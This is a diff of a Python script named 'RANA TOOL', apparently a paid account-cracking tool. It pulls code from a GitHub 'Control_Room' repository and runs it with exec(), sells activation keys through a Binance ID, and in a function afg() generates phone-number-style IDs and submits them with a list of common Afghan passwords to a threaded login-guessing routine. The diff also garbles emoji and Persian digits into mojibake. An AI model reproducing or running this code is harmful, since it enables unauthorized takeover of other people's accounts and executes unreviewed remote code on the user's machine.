@@ -12,7 +12,7 @@ import os,requests,json,time,re,random,sys,uuid,string,subprocess,zlib,platform
 import marshal
 import os,base64
 from os import system as clr
-print('\n\033[0;97m[+]\033[1;32m WELLCOME TO RANA TOOL 🌷...')
+print('\n\033[0;97m[+]\033[1;32m WELLCOME TO RANA TOOL ðŸŒ·...')
 os.system('espeak -a 300 " Wellcome,   To,  ,raana ,Tool,"')
 try:
     import os,requests,json,time,re,random,sys,uuid,string,subprocess
@@ -37,7 +37,7 @@ except:pass
 try:
     version = requests.get('https://raw.githubusercontent.com/Rananadeem5214/File11/main/Control_Room/version').text
 except:
-    print('\x1b[1;91m [\x1b[1;92m+\x1b[1;91m]\x1b[1;92m Your Have No Internet Connection -v ..!');exit()
+    print('\x1b[1;91m [\x1b[1;92m+\x1b[1;91m]\x1b[1;92m Your Have No Internet Connection -v ..!')
 version = version.strip()
 ######Status#########
 try:
@@ -50,7 +50,7 @@ try:
     data = requests.get('https://raw.githubusercontent.com/Rananadeem5214/File11/main/Control_Room/CodeLoc1').text
     exec(data)
 except:
-    print('\x1b[1;91m [\x1b[1;92m+\x1b[1;91m]\x1b[1;92m You Have No Internet Connection-l ..!');exit()
+    print('\x1b[1;91m [\x1b[1;92m+\x1b[1;91m]\x1b[1;92m You Have No Internet Connection-l ..!')
 #######Ua SETUP######
 #removed
 #####_____PAID-SETUP_____#####
@@ -58,7 +58,8 @@ try:
     data = requests.get('https://raw.githubusercontent.com/Rananadeem5214/File11/main/Control_Room/paid').text
     exec(data)
 except:
-    print('\x1b[1;91m [\x1b[1;92m+\x1b[1;91m]\x1b[1;92m You Have No Internet Connection ..!');exit()
+    print('\x1b[1;91m [\x1b[1;92m+\x1b[1;91m]\x1b[1;92m You Have No Internet Connection ..!')
+    
 #<<_________[ COLOR ]_________>>#
 W = '\033[97;1m' 
 B = '\033[96;1m'
@@ -153,12 +154,12 @@ def Activate():
                 print(f'{W} [{R}+{W}] {W}BINANCE ID == {R}442893784 ')
                 line()
                 print(f'{W} [{R}+{W}] {W}FIRST SEND PAYMENT SS WITH KEY')
-                print(f'{W} [{R}+{W}] {W}FOR KEY ISSUE CONTACT WITH\n{W} [{R}+{W}] {R}RANA NADEEM RAJPUT        👈')
+                print(f'{W} [{R}+{W}] {W}FOR KEY ISSUE CONTACT WITH\n{W} [{R}+{W}] {R}RANA NADEEM RAJPUT        ðŸ‘ˆ')
                 line()
                 print(f'{W} [{R}+{W}] {W}GET APPROVAL FOR USE ')
                 print(f'{W} [{R}+{W}] {W}SEND YOUR KEY TO ADMIN')
                 print(f'{W} [{R}+{W}] {W}AND GET APPROVAL')
-                print(f'{W} [{R}+{W}] {W}COPY THIS KEY 👇')
+                print(f'{W} [{R}+{W}] {W}COPY THIS KEY ðŸ‘‡')
                 line()               
                 print(f"{W} [{R}+{W}] {W}YOUR KEY :\x1b[1;97m "+k)
                 line()                
@@ -617,7 +618,7 @@ def afg():
                         line()
                         for psx in user:
                                 ids = code+psx
-                                passlist = [psx,ids,'afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123','Û±Û³Û³Û³ÛµÛ¶Û·Û¸Û¹','Û±Û³Û³Û³ÛµÛ¶','afghan1234','kabul1234','khankhan','khan123','khan123456','khan786']
+                                passlist = [psx,ids,'afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123','Ã›Â±Ã›Â³Ã›Â³Ã›Â³Ã›ÂµÃ›Â¶Ã›Â·Ã›Â¸Ã›Â¹','Ã›Â±Ã›Â³Ã›Â³Ã›Â³Ã›ÂµÃ›Â¶','afghan1234','kabul1234','khankhan','khan123','khan123456','khan786']
                                 ranag1.submit(rd,ids,passlist)
                 print(f'\033[1;37m')
                 line()
